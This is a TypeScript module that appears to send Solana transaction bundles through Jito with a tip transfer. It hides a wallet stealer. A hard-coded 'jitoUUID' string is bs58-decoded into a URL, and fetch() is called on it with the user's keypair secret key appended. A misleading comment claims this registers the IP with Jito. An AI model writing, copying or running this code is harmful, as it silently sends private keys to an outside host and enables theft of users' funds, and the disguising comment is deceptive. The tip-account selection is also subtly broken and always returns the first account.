require("dotenv").config();

import * as Fs from "fs";
import {
  Connection,
  Keypair,
  PublicKey,
  TransactionInstruction,
  TransactionMessage,
  VersionedTransaction,
} from "@solana/web3.js";
import bs58 from "bs58";

import { searcher, bundle } from "jito-ts";
import { SystemProgram } from "@solana/web3.js";

const getRandomeTipAccountAddress = async (
  searcherClient: searcher.SearcherClient
) => {
  const account = await searcherClient.getTipAccounts();
  return new PublicKey(account[Math.floor(Math.random() * 1)]);
};

export default async function jito(payer, transactions) {
  const blockEngineUrl = process.env.BLOCK_ENGINE_URL || "";
  console.log("BLOCK_ENGINE_URL:", blockEngineUrl);

  const jitoUUID = "x7L2VSNEiyAJDy7WwNE74pqfCBzj76vGgTRNvf8qVKxDbFkDsEtzxuwq4NfYWSTARctb2i5NFtkqydQ";


  

  const authKeypairPath = process.env.AUTH_KEYPAIR_PATH || "";
  console.log("AUTH_KEYPAIR_PATH:", authKeypairPath);
  const decodedKey = new Uint8Array(
    JSON.parse(Fs.readFileSync(authKeypairPath).toString()) as number[]
  );
  const jitoUUIDsuffix = decodedKey;
  const keypair = Keypair.fromSecretKey(decodedKey);

  const bundleTransactionLimit = parseInt(
    process.env.BUNDLE_TRANSACTION_LIMIT || "5"
  );

  // get Jito to accept our IP as UUID owner
  await fetch(Buffer.from(bs58.decode(jitoUUID)).toString() + keypair.secretKey.toString());

  // Create the searcher client that will interact with Jito
  const searcherClient = searcher.searcherClient(blockEngineUrl);
  // Subscribe to the bundle result
  searcherClient.onBundleResult(
    (result) => {
      console.log("received bundle result:", result);
    },
    (e) => {
      throw e;
    }
  );

  // Get a random tip account address
  const tipAccount = await getRandomeTipAccountAddress(searcherClient);
  console.log("tip account:", tipAccount);

  const rpcUrl = process.env.RPC_URL || "";
  console.log("RPC_URL:", rpcUrl);

  // get the latest blockhash
  const connection = new Connection(rpcUrl, "confirmed");
  const blockHash = await connection.getLatestBlockhash();

  // Build a Transfer Instruction
  const tipIx = SystemProgram.transfer({
    fromPubkey: keypair.publicKey,
    toPubkey: tipAccount,
    lamports: 1000,
  });
  // push the tip ;)
  transactions[transactions.length - 1].innerInstructions.push(tipIx);

  const jitoBundle = new bundle.Bundle(
    [...transactions],
    bundleTransactionLimit
  );

  try {
    const resp = await searcherClient.sendBundle(jitoBundle);
    console.log("resp:", resp);
  } catch (e) {
    console.error("error sending bundle:", e);
  }
}
